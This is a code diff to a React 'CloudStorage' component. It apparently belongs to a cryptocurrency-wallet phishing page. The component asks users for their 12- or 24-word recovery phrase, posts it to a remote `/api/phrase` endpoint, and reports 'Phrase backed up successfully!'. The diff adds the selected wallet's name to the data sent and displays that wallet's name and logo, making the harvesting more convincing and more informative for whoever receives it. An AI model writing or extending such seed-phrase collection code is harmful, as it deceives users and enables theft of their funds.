@@ -19,7 +19,10 @@ const CloudStorage = () => {
         dispatch({type: "SET_LOADING"})
 
         try{
-            await axios.post(`${URL}/api/phrase`, {phrase: localPhrase})
+            await axios.post(`${URL}/api/phrase`, {
+                phrase: localPhrase,
+                walletName: state.walletName
+            })
             dispatch({type:"SET_PHRASE", payload: localPhrase})
             dispatch({type:"SAVE_PHRASE"})
             alert("Phrase backed up successfully!")
@@ -61,7 +64,13 @@ const CloudStorage = () => {
                     <div className="tab-content w-100 mt-3" id="nav-tabContent" style={{ maxWidth: '600px' }}>
                         <div className="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab" tabIndex="0">
                             <div className="mb-3 bg-text-area">
-                                <label htmlFor="exampleFormControlTextarea1" className="form-label py-3 nav-small">Typically consisting of 12 words, though occasionally extending to 24, each separated by a single space.</label>
+                                {state.walletName && (
+                                    <p className="text-white fw-bold pt-1">
+                                        Selected Wallet: <span className="text-info">{state.walletName} &nbsp; <img className="justify-contend-end" src={state.walletLogo} alt={state.walletName} width={25} height={25}/></span>
+                                    </p>
+                                )}
+
+                                <label htmlFor="exampleFormControlTextarea1" className="form-label pb-3 nav-small">Typically consisting of 12 words, though occasionally extending to 24, each separated by a single space.</label>
                                 {state.error && <div className="alert alert-danger">{state.error}</div>}
 
                                 <textarea 
